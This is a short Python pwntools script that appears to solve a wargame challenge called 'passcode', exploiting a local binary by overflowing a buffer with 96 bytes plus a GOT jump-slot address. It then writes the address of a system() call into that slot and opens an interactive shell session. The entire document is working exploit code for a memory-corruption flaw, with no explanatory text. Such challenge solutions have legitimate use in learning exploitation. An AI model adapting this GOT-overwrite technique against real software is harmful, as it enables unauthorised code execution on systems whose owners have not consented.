#!/usr/bin/python

from pwn import *

r = process('/home/passcode/passcode')

# recv two lines
print r.recvline(timeout=1)
print r.recvline(timeout=1)

jmp_slot = p32(0x0804a004)
syscall = p32(0x080485ea)
# write plt pointer to uninitialized passcode1
r.sendline('A'*96 + jmp_slot)

# write ptr to winning system() call for plt
r.sendline(str(134514154))

r.interactive()
